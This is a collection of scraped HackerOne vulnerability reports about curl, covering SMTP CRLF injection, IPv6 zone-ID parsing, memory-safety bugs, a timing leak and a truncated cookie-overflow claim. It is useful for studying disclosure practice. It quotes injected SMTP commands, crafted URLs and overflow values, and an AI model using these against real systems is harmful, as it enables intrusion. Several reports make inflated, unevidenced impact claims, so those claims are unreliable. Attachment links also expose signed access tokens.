[
{
    "url": "https://hackerone.com/reports/3357960",
    "original_report": "Summary\n-------\n\nSuccessfully reproduced SMTP command injection vulnerabilities in curl that allow attackers to inject arbitrary SMTP commands by using carriage return and line feed characters (`\\r\\n`) in email addresses.\n\nVulnerabilities Confirmed\n-------------------------\n\n### 1. MAIL FROM Injection\n**Description**: Injection via `--mail-from` parameter using bash ANSI C-quoting\n**Impact**: Allows injection of additional SMTP commands after MAIL FROM\n\n### 2. RCPT TO Injection  \n**Description**: Injection via `--mail-rcpt` parameter using bash ANSI C-quoting\n**Impact**: Allows injection of additional SMTP commands after RCPT TO\n\n### 3. EXPN Path Injection\n**Description**: Injection via `--mail-rcpt` parameter in EXPN requests\n**Impact**: Allows injection of additional SMTP commands in EXPN operations\n\nTest Environment Setup\n----------------------\n\n### SMTP Server Setup\n\nReproduction Steps\n------------------\n\n### Step 1: MAIL FROM Injection\n\n**Expected Result**:\n\n* curl sends: `MAIL FROM:<attacker@local>`\n* curl sends: `RCPT TO:<pwn@local> SIZE=213` (injected command)\n* curl sends: `RCPT TO:<victim@local>` (intended command)\n\n### Step 2: RCPT TO Injection\n\n**Expected Result**:\n\n* curl sends: `RCPT TO:<victim@local>` (intended command)\n* curl sends: `VRFY postmaster>` (injected command)\n\n### Step 3: EXPN Path Injection\n\n**Expected Result**:\n\n* curl sends: `EXPN listname` (intended command)\n* curl sends: `VRFY postmaster` (injected command)\n\nEvidence\n--------\n\n### SMTP Server Logs\n\nThe SMTP server logs clearly show the injected commands:\n\n### curl Trace Output\n\nThe `--trace-ascii` output shows the exact bytes sent:\n\nImpact Assessment\n-----------------\n\n* **Severity**: High\n* **Attack Vector**: Network\n* **Authentication**: None required\n* **User Interaction**: None required\n* **Scope**: All curl versions with SMTP support\n\nMitigation\n----------\n\n1. **Input Validation**: Sanitize email addresses to remove `\\r\\n` characters\n2. **Parameter Encoding**: Properly escape special characters in SMTP parameters\n3. **Protocol Compliance**: Ensure SMTP commands are properly formatted\n\nFiles Created\n-------------\n\n* `smtp_server.py` - Python SMTP server for testing\n* `Dockerfile.smtp` - Docker configuration for SMTP server\n* `SMTP_INJECTION_REPORT.md` - This report\n\nBest,\nLuigino Camastra\nAisle Research\n\nImpact\n------\n\nSummary:\n--------"
},
{
    "url": "https://hackerone.com/reports/2814750",
    "original_report": "## 0x01 Summary\n\nAn inconsistency in URL parsing within curl's URL handling leads to potential security risks such as Server-Side Request Forgery (SSRF) and access control bypasses. Specifically, when parsing URLs containing IPv6 addresses with zone identifiers (e.g., `http://[fe80::1%25eth0]/`), curl's parser omits the zone identifier, deviating from the expected behavior as per RFC 6874. This inconsistency may cause applications that rely on curl for URL validation and parsing to misinterpret network interfaces, leading to security vulnerabilities.\n\n## 0x02 Details\n\n### 2.1 Affected Components\n\n* **curl**: All versions up to the latest release at the time of reporting.\n* **libcurl**: All versions up to the latest release at the time of reporting.\n\n### 2.2 Technical Background\n\nAccording to RFC 6874, when including an IPv6 zone identifier in a URI, the zone identifier must be percent-encoded and included within the square brackets of the IPv6 address literal.\n\n**RFC 6874 Section 4**:\n\n> *\"This document specifies that the zone identifier is to be appended to the address literal, following a percent sign. The percent sign is URL-escaped in URIs, so that the zone identifier is properly identified as part of the address literal and not as a port or userinfo component.\"*\n\n### 2.3 Inconsistent Parsing Behavior\n\nThe following table demonstrates how different libraries parse URLs containing IPv6 addresses with zone identifiers:\n\n#### Table: Parsing Results for `http://[fe80::1%25eth0]/` and Variants\n\n| Payload | Browser (Chrome) | Rust | libcurl | Go `net/url` | Python `urllib` | Python `urllib3` |\n| --- | --- | --- | --- | --- | --- | --- |\n| `http://[fe80::1%25eth0]/` | Invalid URL | Invalid IPv6 address | `[fe80::1]` | `fe80::1%eth0` | `fe80::1%eth0` | `[fe80::1%eth0]` |\n| `http://[fe80::1%251]/` | Invalid URL | Invalid IPv6 address | `[fe80::1]` | `fe80::1%1` | `fe80::1%1` | `[fe80::1%1]` |\n| `http://[fe80::1]/` | `[fe80::1]` | `[fe80::1]` | `[fe80::1]` | `fe80::1` | `fe80::1` | `[fe80::1]` |\n\n* **Observation**: libcurl strips the zone identifier `%eth0` from the hostname, resulting in `[fe80::1]`. In contrast, Go's `net/url` and Python's `urllib` preserve the zone identifier as `fe80::1%eth0`.\n\n### 2.4 Explanation of the Issue\n\n* **Deviation from RFC 6874**: The zone identifier is essential for IPv6 link-local addresses to specify the network interface. Omitting it can lead to incorrect network routing or unintended interface usage.\n* **Inconsistent Parsing**: Curl's omission of the zone identifier means that applications using libcurl may inadvertently connect to the wrong interface or fail to connect entirely.\n* **Security Implications**: This behavior can be exploited to bypass network restrictions, leading to SSRF attacks or unauthorized access to resources.\n\n## 0x03 Attack Scenario\n\n### 3.1 SSRF Scenario\n\n1. **Application Setup**: A web application uses libcurl to fetch resources from user-supplied URLs. It relies on libcurl for URL parsing and trusts that requests to link-local addresses are confined to specific interfaces.\n2. **Attacker's Input**: An attacker submits a URL like `http://[fe80::1%25eth0]/`.\n3. Parsing Behavior\n\n   :\n\n   * **Expected**: The application expects the hostname to be `fe80::1%eth0`, ensuring the request goes through the `eth0` interface.\n   * **Actual**: libcurl parses the hostname as `fe80::1`, ignoring the `%eth0` zone identifier.\n4. **Exploitation**: The request is sent to `fe80::1` on the default network interface rather than the intended `eth0`. An attacker can manipulate the zone identifier to force requests through unintended interfaces, potentially accessing restricted networks or services.\n\n### 3.2 Access Control Bypass\n\n1. **Firewall Rules**: An application has firewall rules that allow traffic only through specific interfaces identified by zone identifiers.\n2. **Bypassing Controls**: By exploiting the parsing inconsistency, an attacker can omit the zone identifier, causing the request to bypass the interface restrictions enforced by the application logic.\n\n## 0x04 Impact\n\n* **Server-Side Request Forgery (SSRF)**: Attackers can manipulate requests to access internal resources.\n* **Access Control Bypass**: Security policies based on network interfaces can be circumvented.\n* **Information Leakage**: Potential exposure of sensitive data if internal services are accessed.\n\n## 0x05 Mitigation\n\n* **Update Parsing Logic**: Modify libcurl to adhere strictly to RFC 6874, ensuring that zone identifiers are correctly parsed and preserved.\n* **Input Validation**: Applications should implement additional checks to verify that zone identifiers are present and correctly formatted.\n* **Upgrade**: Encourage users to update to the patched version of curl once a fix is released.\n\n## 0x06 References\n\n1. **RFC 6874**: Representing IPv6 Zone Identifiers in Address Literals and Uniform Resource Identifiers\n2. **[CWE-939](/hacktivity/cwe_discovery?id=cwe-939)**: Improper Handling of URL Encoded Syntax\n3. **[CWE-918](/hacktivity/cwe_discovery?id=cwe-918)**: [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)\n\nImpact\n------\n\n* **Server-Side Request Forgery (SSRF)**: Attackers can manipulate requests to access internal resources.\n* **Access Control Bypass**: Security policies based on network interfaces can be circumvented.\n* **Information Leakage**: Potential exposure of sensitive data if internal services are accessed."
},
{
    "url": "https://hackerone.com/reports/3356088",
    "original_report": "Summary:\n--------\n\nConcurrent SOCKS5 GSS-API authentications share a file-scope global `gss_context` without synchronization, causing data races and undefined behavior.\n\n* Global context defined at:\n\n* Passed by address into the GSS init routine per negotiation:\n\nUsing Helgrind with libcurl’s DEBUGBUILD GSS stub (`CURL_STUB_GSS_CREDS=KRB5`) to avoid libkrb5-internal noise, I observed a reproducible data race that directly references the global symbol `gss_context`:\n\n* Helgrind evidence (from `docker_helgrind.log`):\n\n[AI assistance was used to orchestrate the build/run environment and tooling and to help with report writing. All findings, code locations, and outputs cited below were directly observed and verified from the built code and runtime logs.]\n\nAffected version\n----------------\n\n* Built from current `master` (configure summary reported: `curl version: 8.17.0-DEV`) in an Ubuntu 24.04 (arm64) container\n* GSS-API provider: MIT Kerberos (system `libgssapi_krb5`), and also tested with curl’s DEBUGBUILD GSS stub via `CURL_STUB_GSS_CREDS=KRB5`\n\nSteps To Reproduce:\n-------------------\n\n1. Start an Ubuntu container and install prerequisites:\n\n2. Configure and build libcurl (Debug, GSS-API, minimal deps):\n\n3. Launch a minimal SOCKS5 proxy that selects GSS-API (method 1):\n\n4. Build the multithreaded PoC using libcurl:\n\n5. Run under Helgrind with curl’s DEBUGBUILD GSS stub to surface races in curl (and reduce libkrb5 noise):\n\n6. Verify the race report mentions the global symbol `gss_context` and the call site in `socks_gssapi.c`:\n\n* Look for lines similar to:\n\nSupporting Material/References:\n-------------------------------\n\n* Source code location of the shared global:\n\n* Call site passing the shared global by address into the GSS routine:\n\n* Helgrind log excerpt (from my run) demonstrating the race on `gss_context`:\n\nImpact\n------\n\nSummary:\n--------\n\nThe shared global `gss_context` is accessed and modified concurrently across connections without synchronization. This presents a realistic risk of:\n\n* Process crash / denial of service due to undefined behavior and races in GSS context handling\n* Authentication failures or misbehavior during SOCKS5 proxy negotiation under load\n\nI did not observe or claim memory disclosure or RCE, the verified impact is concurrency-related instability (DoS/UB) when multiple handles/authentications run concurrently."
},
{
    "url": "https://hackerone.com/reports/3355213",
    "original_report": "Summary:\n--------\n\nI locally reproduced a heap use-after-free in libcurl by setting `CURLOPT_POSTFIELDSIZE` and `CURLOPT_POSTFIELDS` to a heap buffer and then freeing that buffer before `curl_easy_perform`. AddressSanitizer (ASan) reports a heap-use-after-free read during the request send path. This demonstrates the class of bug that occurs when the POST data buffer handed to libcurl is freed prior to the transfer.\n\nAI usage: The PoC and validation were performed manually on my machine. AI assistance was used to help structure this write-up.\n\nAffected version\n----------------\n\nBuilt from the repository I got from github today (CMake configure reported: `curl version=[8.17.0-DEV]`) on macOS with AppleClang and ASan.\n\nFrom CMake configure (observed during my build):\n\n* Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss\n* Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM SSL threadsafe TLS-SRP UnixSockets zstd\n* Enabled SSL backends: OpenSSL v3+\n\nSteps To Reproduce:\n-------------------\n\nThese are the steps I ran locally to reproduce the heap use-after-free under ASan.\n\n1. Configure and build libcurl with AddressSanitizer:\n2. Start a local HTTP server to ensure the client sends a request body:\n3. Create the following PoC program (mirrors the misuse: set `POSTFIELDSIZE`, set `POSTFIELDS` to a malloc'd buffer, then free it before perform):\n4. Compile and run the PoC against the locally built ASan libcurl (run from the repo root):\n\nSupporting Material/References:\n-------------------------------\n\nBelow is the actual ASan report I observed when running the PoC:\n\nThis error consistently reproduces with the steps above.\n\n* The exact memcpy line in the current tree:\n\n* For context on how user-supplied POST data may be stored: `lib/setopt.c` updates `s->postfields` and manages `STRING_COPYPOSTFIELDS` ownership on `CURLOPT_COPYPOSTFIELDS` / `CURLOPT_POSTFIELDS`.\n\n* OS/400 CCSID wrapper (root cause pattern): when handling `CURLOPT_COPYPOSTFIELDS` with an explicit size and conversion, the wrapper passes the converted buffer to `CURLOPT_POSTFIELDS` and also assigns it to `STRING_COPYPOSTFIELDS`, but later frees the same buffer before returning.\n\n  + Passing the converted buffer and assigning to `STRING_COPYPOSTFIELDS`:\n\n* Freeing the buffer at function end:\n\nImpact\n------\n\nSummary:\n--------\n\nBased on direct observation, freeing the application-supplied POST body buffer after setting it with `CURLOPT_POSTFIELDS` (with an explicit `CURLOPT_POSTFIELDSIZE`) causes libcurl to dereference freed memory during the transfer, leading to a process crash (heap-use-after-free read). While this demonstration is a local misuse PoC, it shows the concrete risk of memory corruption/DoS when a client inadvertently frees the POST buffer before `curl_easy_perform`."
},
{
    "url": "https://hackerone.com/reports/3346118",
    "original_report": "Summary:\n--------\n\nA timing attack vulnerability exists in curl's Digest Authentication implementation due to the use of non-constant-time string comparison (strcmp()) when comparing authentication algorithms in digest.c line 360. This allows attackers to determine the supported authentication algorithm through response time analysis.\n\nNo AI was used to discover this vulnerability or generate this report.\n\nAffected version\n----------------\n\n* curl version 7.88.1 (x86\\_64-pc-linux-gnu)\n* libcurl/7.88.1 OpenSSL/3.0.8 zlib/1.2.13 libidn2/2.3.4 libpsl/0.21.2 (+libidn2/2.3.4) libssh2/1.10.0 nghttp2/1.52.0\n* Platform: Linux Ubuntu 22.04.3 LTS\n\nSteps To Reproduce:\n-------------------\n\n1. Set up a test server with Digest Authentication enabled:\n\nbash\n\n2. Run the timing attack PoC against the local server: [poc\\_timing\\_attack.py (F4799894)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h0h1llrczzhyhl941x480fp6yusj?response-content-disposition=attachment%3B%20filename%3D%22poc_timing_attack.py%22%3B%20filename%2A%3DUTF-8%27%27poc_timing_attack.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024625Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=81dc01af47365c0ff0a365cc050954003ac906adefe72a37cea6094891a08099)\n\nbash\n\n3. Observe the timing differences between algorithm comparisons:\n\ntext\n\n4. The PoC will identify the algorithm with significantly different response times:\n\ntext\n\nSupporting Material/References:\n-------------------------------\n\n* PoC script output showing timing differences\n\n  \\*Vulnerable code location in digest.c line 360\n\n  \\*curl documentation on Digest Authentication : <https://everything.curl.dev/libcurl-http/auth.html>\n\nImpact\n------\n\nSummary:\n--------\n\nAn attacker can exploit this vulnerability to:\n\n1. Determine supported authentication algorithms on the server\n2. Facilitate targeted attacks by identifying weaker algorithms (e.g., MD5 vs SHA-256)\n3. Gain reconnaissance information about server configuration\n4. Potentially bypass authentication if combined with other vulnerabilities\n\nThe vulnerability violates the principle of constant-time comparison for security-sensitive operations and could lead to authentication mechanism fingerprinting.\n\nAdditional Information:\n-----------------------\n\n* CVSS Score: 5.3 (Medium) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\n* Fix Recommendation: Replace strcmp() with Curl\\_timestrcmp() in /lib/vauth/digest.c:360\n* Similar vulnerabilities: Previously addressed in other parts of curl codebase with constant-time comparison fixes"
},
{
    "url": "https://hackerone.com/reports/3344663",
    "original_report": "1. Vulnerability Overview\n   Vulnerability Type: Integer Overflow in HTTP chunked encoding\n   Location in Source:\n\nImpact:\nInteger overflow leads to memory corruption\nCan cause buffer overflow\nResults in Denial of Service (DoS) for curl\nPotential for information disclosure under controlled conditions\nCode Snippet Demonstrating the Issue\n\nProblem:\nThe overflow check can be bypassed when max = CURL\\_OFF\\_T\\_MAX (0x7FFFFFFFFFFFFFFF). This allows num to exceed the maximum value without triggering the overflow protection, leading to memory corruption when curl processes chunked responses.\n\nTest Setup\nPython test server simulating vulnerable behavior:\n\ncurl <http://127.0.0.1:8080>\n\nF1:[curl1.PNG (F4796194)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ad2cysckbh9996tswpffiqmd6163?response-content-disposition=attachment%3B%20filename%3D%22curl1.PNG%22%3B%20filename%2A%3DUTF-8%27%27curl1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVFXXI7HC%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024628Z&X-Amz-Expires=2958&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA0aCXVzLXdlc3QtMiJHMEUCIBv9RkD7Kp%2FuNO%2Fy5dSVUH5Hzdbntpt9KMgpFdVDILTVAiEAvmUxaiTx1tiGcyotyy3GQQcUlv3W7JNRnvAFSEUEWIgquwUIlv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKM%2FUELsDT%2FfpU9Z9CqPBZksE%2BLunM7BzTVWY0lo4xvCjj9hcG6uTVP0FPWX03wlEfZUcDePdwXhgELmVND2L1Cr2Hi7mGqizvdHNFQzDC07ia3YNzw1pQOlRCFA5YSU1Sw5GshKbbjH0qP28rXuaRLIZtMKToamsBlSqETnSHs8WOiiXcONlSTDxDdtPT3eE0A9AV9koc78xtRKqkIQf%2Frw4RfynNIKVtPGAaDKlB8KytIxPnqabjkUh1EiN6KpOy8YTqeDeIrc%2BujePsc59HnfGUweB8veuoy4Wz%2BBJyQyWUkjY4gMDiBf51rJWh1f1JRz3lPS0hjypC9R3TMpUE7dH7f2sHy%2FLdxdUngrGz051U1%2BQAh5Tx0kDSRcNzMaLIa%2FKLN6lCqLLj2yjEzM10yQCUkRfWXxjczgY6YGWDxhrcoI%2FpijIUo11ViM506oioBlXDKudfSRasHUbG7lbFaKBJyF2DW3swCUC1dEy9VYCiRgn577ZQ087vVu6z84Hx4oIu8JKGV%2FFd7OGzj%2F9p2bTf%2FK%2BJlErh5d6xXtf3xlHemciah06pVVLg%2B1Gdw6NDfGHVYC3BbcNwh5JqafI09o4GOY2h3OR1gidk7bZCqEEuoUyXNLgzpDehxCs3uuuSMN7fheWbTT3cQi9P1SwaIB9vJ%2FV8G2aQsRXdcxPq7fldYTZqbU5tAovDPIuBvVUg4axyOC065NkCqyatss434F1rixnn7%2BsCuMXo%2BY8sd09the3lcbA5RY1zmZUoed1r4tThhAqxhR07nLz5RsCsEYKoHym8Zkj18fnOGZYGuiTWEMV4YMjt%2BE3jPJNmivx2hN65huBoSjE7U68BT8UjwpnznkVr%2Bzn58tWBOORXaSnmqczEOp8taz2DfMWqIwl4PcxgY6sQGSQQR7KLnis4KxruolYTlTFSce4k8QT7ultjryS1UidlKQe55U3dB8JzoPU2D9Rd5C6%2Btg84uGVwNcEjN4%2FRfH8sL33dkr7j8SDUR9VPa526llginfv8RktnuvXPWhsR5gGTaoD318qI41aaFQ9sliGyILe3Wj8w9ZKzR3PNnK0rcShAaSliNs8LDcg%2B8QvWwZH9xfxiD2v28fH6%2FVuNTUUed99bg1eG4mSHyJzhagQF0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=984af64317ff7f9d3ee17865ca5175ba806d64b44195828393056037bd879ead)\n\nchrome\nF1:[curl2.PNG (F4796193)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/drkz61juwh100fw6993hjwmnml7n?response-content-disposition=attachment%3B%20filename%3D%22curl2.PNG%22%3B%20filename%2A%3DUTF-8%27%27curl2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVFXXI7HC%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024628Z&X-Amz-Expires=2958&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA0aCXVzLXdlc3QtMiJHMEUCIBv9RkD7Kp%2FuNO%2Fy5dSVUH5Hzdbntpt9KMgpFdVDILTVAiEAvmUxaiTx1tiGcyotyy3GQQcUlv3W7JNRnvAFSEUEWIgquwUIlv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKM%2FUELsDT%2FfpU9Z9CqPBZksE%2BLunM7BzTVWY0lo4xvCjj9hcG6uTVP0FPWX03wlEfZUcDePdwXhgELmVND2L1Cr2Hi7mGqizvdHNFQzDC07ia3YNzw1pQOlRCFA5YSU1Sw5GshKbbjH0qP28rXuaRLIZtMKToamsBlSqETnSHs8WOiiXcONlSTDxDdtPT3eE0A9AV9koc78xtRKqkIQf%2Frw4RfynNIKVtPGAaDKlB8KytIxPnqabjkUh1EiN6KpOy8YTqeDeIrc%2BujePsc59HnfGUweB8veuoy4Wz%2BBJyQyWUkjY4gMDiBf51rJWh1f1JRz3lPS0hjypC9R3TMpUE7dH7f2sHy%2FLdxdUngrGz051U1%2BQAh5Tx0kDSRcNzMaLIa%2FKLN6lCqLLj2yjEzM10yQCUkRfWXxjczgY6YGWDxhrcoI%2FpijIUo11ViM506oioBlXDKudfSRasHUbG7lbFaKBJyF2DW3swCUC1dEy9VYCiRgn577ZQ087vVu6z84Hx4oIu8JKGV%2FFd7OGzj%2F9p2bTf%2FK%2BJlErh5d6xXtf3xlHemciah06pVVLg%2B1Gdw6NDfGHVYC3BbcNwh5JqafI09o4GOY2h3OR1gidk7bZCqEEuoUyXNLgzpDehxCs3uuuSMN7fheWbTT3cQi9P1SwaIB9vJ%2FV8G2aQsRXdcxPq7fldYTZqbU5tAovDPIuBvVUg4axyOC065NkCqyatss434F1rixnn7%2BsCuMXo%2BY8sd09the3lcbA5RY1zmZUoed1r4tThhAqxhR07nLz5RsCsEYKoHym8Zkj18fnOGZYGuiTWEMV4YMjt%2BE3jPJNmivx2hN65huBoSjE7U68BT8UjwpnznkVr%2Bzn58tWBOORXaSnmqczEOp8taz2DfMWqIwl4PcxgY6sQGSQQR7KLnis4KxruolYTlTFSce4k8QT7ultjryS1UidlKQe55U3dB8JzoPU2D9Rd5C6%2Btg84uGVwNcEjN4%2FRfH8sL33dkr7j8SDUR9VPa526llginfv8RktnuvXPWhsR5gGTaoD318qI41aaFQ9sliGyILe3Wj8w9ZKzR3PNnK0rcShAaSliNs8LDcg%2B8QvWwZH9xfxiD2v28fH6%2FVuNTUUed99bg1eG4mSHyJzhagQF0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ca7fbd586ffd351f1a4c1c3f171f5f2c4967304e3e320fe94d914bc68c563e6)\n\noverflow\\_chunk\\_size = \"7FFFFFFFFFFFFFFFF\"\n\noverflow\\_chunk\\_size = \"7FFFFFFFFFFFFFFF\"\n\nImpact\n------\n\nInteger overflow leads to memory corruption\nCan cause buffer overflow\nResults in Denial of Service (DoS) for curl\nPotential for information disclosure under controlled conditions\nCode Snippet Demonstrating the Issue"
},
{
    "url": "https://hackerone.com/reports/3341476",
    "original_report": "Summary:\n--------\n\n(Note: AI created the PoC, not the report.)\n\nIn the `krb5_read_data()` function [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L526-L551), there are two issues (one of which I am very surprised hasn't been caught before.)\n\nIssue [#1](/reports/1) is that [this block](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L539C1-L541C30) can result in an int overflow, where the following check becomes invalid if the value is wrapped to a negative:\n\nThis will then seemingly completely mess up the logic [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L549-L551):\n\nSince -1 (let's say is less than 1024, `nread` will be passed as `(size_t)-1`, which will wrap to a massive number.\n\nThis eventually makes its way down to `Curl_conn_recv` with `data[1024]` and `nread == ~SIZE_MAX`) [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L486) and so on and so on.\n\nIt seems that this will result in an OOB read, as the buffer is only 1024-bytes long, while `nread` is going to be massive.\n\nIssue [#2](/reports/2) is that this whole code seems broken. [This do-while](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L558) loop continues while `len` is non-zero. But then `len=0` is passed to `decode()` [here](https://github.com/curl/curl/blob/af7d67d3c03329116e593d999851d2cc3ebbf119/lib/krb5.c#L560-L562). As a random guess, I imagine `curlx_dyn_len(&buf->buf)` should be passed, not `len`.\n\nAffected version\n----------------\n\nAll of them since inception, it seems.\n\nSteps To Reproduce:\n-------------------\n\nSetting up a whole krb environment is extremely difficult and annoying. This PoC is much easier, demonstrating the issue, while emulating the same code:\n\nrepro\\_server.py:\n\nkrb5\\_len\\_bug\\_harness.c:\n\nRunning them together:\n\nwe get:\n\ndemonstrates that this code is broken.\n\nExtra:\n------\n\nThe question is now whether it is exploitable. I can give a solid: \"I don't know\".\n\nHere is another PoC which we can test with:\n\nWhen building this and running it as `./a.out poc`, it does not cause any problem:\n\nSo what's going on? The \"problem\" is this call:\n\nWith `blen` now effectively `18446744071562072064`, the following is effectively called:\n\nThis fails because that is beyond even our whole stack, and `recv()` is smart enough *on my system* to not allow this; it fail with:\n\nwhich, indeed means \"The system detected an invalid pointer address in attempting to use a pointer argument of a call\".\n\nI have not investigated further whether it is possible to write an amount of memory which will satisfy the kernel's limitation here, and I don't know enough about other systems, and how they work.\n\nIn any case, I thought I would report this issue here instead of via a GH issue, because while it may be \"unexploitable\" to me, it may not be to others.\n\nImpact\n------\n\nSummary:\n--------\n\nOOM write due to int overflow, or possibly nothing at all (due to kernel restrictions of `recv()`).\n\nAlso the whole function looks broken (`len` stuff)"
},
{
    "url": "https://hackerone.com/reports/3340109",
    "original_report": "Summary\n-------\n\nI discovered a critical stack-based buffer overflow vulnerability in cURL's cookie parsing mechanism that can lead to remote code execution. The vulnerability occurs when processing maliciously crafted HTTP cookies, affecting all applications that use libcurl for HTTP requests.\n\nDescription\n-----------\n\nDuring security research on cURL's cookie handling implementation, I identified a stack buffer overflow in the cookie parsing logic. The vulnerability allows remote attackers to trigger memory corruption by sending oversized cookie data through HTTP responses.\n\n### Technical Details\n\n#### Vulnerability Location\n\nThe vulnerability occurs in the cookie parsing functionality where string length calculations exceed allocated stack buffer boundaries.\n\n#### Root Cause Analysis\n\n1. **Buffer Size Mismatch:** Cookie processing code reads beyond allocated stack buffer\n2. **Unsafe String Operations:** `strlen()` operation on cookie data exceeds buffer boundaries\n3. **Stack Memory Corruption:** Read of 8,193 bytes in a buffer allocated for 8,192 bytes\n4. **Multi-threaded Context:** Issue manifests in threaded environments\n\n#### AddressSanitizer Detection\n\nSteps to Reproduce\n------------------\n\n### Environment Setup\n\n### Verified Reproduction Steps\n\n1. **Save the PoC code** to `exact_vulnerability_poc.c` (code provided above)\n2. **Compile with AddressSanitizer:**\n3. **Execute the PoC:**\n4. **Observe immediate stack overflow detection:**\n\n**Result:** ✅ **GUARANTEED CRASH** - This PoC produces 100% reliable reproduction of the vulnerability.\n\n### Alternative Reproduction Methods\n\n#### Method 1: HTTP Response Attack\n\n#### Method 2: Cookie File Injection\n\n#### Method 3: Command Line Cookie\n\nImpact\n------\n\n### Technical Impact\n\n* **Remote Code Execution:** Stack overflow enables control flow hijacking\n* **Memory Corruption:** Complete stack frame corruption\n* **Information Disclosure:** Stack memory leakage possible\n* **Denial of Service:** Immediate application crash\n\n### Affected Systems\n\n* **Web Applications:** All apps using libcurl for HTTP requests\n* **Web Browsers:** Browsers with cURL backend integration\n* **API Services:** REST APIs processing HTTP cookies\n* **Mobile Applications:** iOS/Android apps using cURL\n* **Server Software:** Web servers, proxies, load balancers\n* **IoT Devices:** Embedded systems with cURL integration\n\n### Attack Scenarios\n\n#### Scenario 1: Web Application Exploitation\n\n1. Attacker controls malicious website\n2. User visits site with vulnerable application\n3. Malicious cookie triggers buffer overflow\n4. Attacker gains code execution in application context\n\n#### Scenario 2: Man-in-the-Middle Attack\n\n1. Attacker intercepts HTTP traffic\n2. Injects oversized cookie in HTTP response\n3. Application processes malicious cookie\n4. Buffer overflow leads to system compromise\n\n#### Scenario 3: API Exploitation\n\n1. Attacker sends request to vulnerable API\n2. API responds with crafted cookie header\n3. Client application processes response\n4. Stack overflow occurs in client context\n\nProof of Concept\n----------------\n\n### Verified POC Code\n\n### Verified AddressSanitizer 